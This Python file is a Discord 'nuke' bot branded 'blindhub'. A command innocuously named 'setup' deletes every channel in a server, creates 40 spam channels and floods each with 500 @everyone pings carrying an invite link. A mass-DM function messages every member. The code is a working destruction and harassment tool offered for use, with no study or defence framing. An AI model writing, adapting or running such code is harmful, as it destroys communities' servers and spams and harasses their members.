import discord
from discord.ext import commands
import os
import asyncio

# Configuration
prefix = "!"
channel_name = "nuked by blindhub"
spam_message = "@everyone NUKED BY BLINDHUB https://discord.gg/srUu6NmuTR "
channels_to_create = 40
pings_per_channel = 500

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online and ready.")

async def spam_channel(channel):
    for i in range(pings_per_channel):
        try:
            await channel.send(spam_message)
            if (i + 1) % 10 == 0:
                print(f"Sent {i + 1} messages in {channel.name}")
            await asyncio.sleep(0.3)  # small delay to reduce rate limit chances
        except Exception as e:
            print(f"Failed to send message in {channel.name}: {e}")
            break

@bot.command()
async def setup(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print("⚠️ Starting NUKE sequence...")

    # Delete all channels
    channels = list(guild.channels)
    print(f"Deleting {len(channels)} channels...")
    sem = asyncio.Semaphore(5)

    async def safe_delete(channel):
        async with sem:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Failed to delete channel {channel.name}: {e}")

    await asyncio.gather(*(safe_delete(c) for c in channels))
    await asyncio.sleep(2)

    # Create channels
    print(f"Creating {channels_to_create} channels...")
    created_channels = []
    for i in range(channels_to_create):
        try:
            channel = await guild.create_text_channel(f"{channel_name}-{i}")
            created_channels.append(channel)
            print(f"Created channel: {channel.name}")
            await asyncio.sleep(0.1)  # delay to reduce rate limit
        except Exception as e:
            print(f"Failed to create channel {i}: {e}")

    # Spam all channels concurrently
    print("Starting to spam all channels...")
    spam_tasks = [asyncio.create_task(spam_channel(ch)) for ch in created_channels]
    await asyncio.gather(*spam_tasks)

    print("✅ NUKE complete.")



import asyncio

async def massdm(ctx, message: str):
    await ctx.message.delete()
    guild = ctx.guild
    print("⚠️ Starting MASS DM sequence...")

    members = list(guild.members)
    print(f"Found {len(members)} members in the server.")
    sem = asyncio.Semaphore(5)

    async def send_dm(member):
        async with sem:
            try:
                await member.send(message)
                print(f"Sent DM to {member.name}")
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"Failed to send DM to {member.name}: {e}")

    async def main(members):
        await asyncio.gather(*(send_dm(m) for m in members))
        print("MASS DM complete.")

    await main(members)  # <-- call main



if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ Error: DISCORD_TOKEN environment variable not found.")
        exit(1)
    bot.run(token)
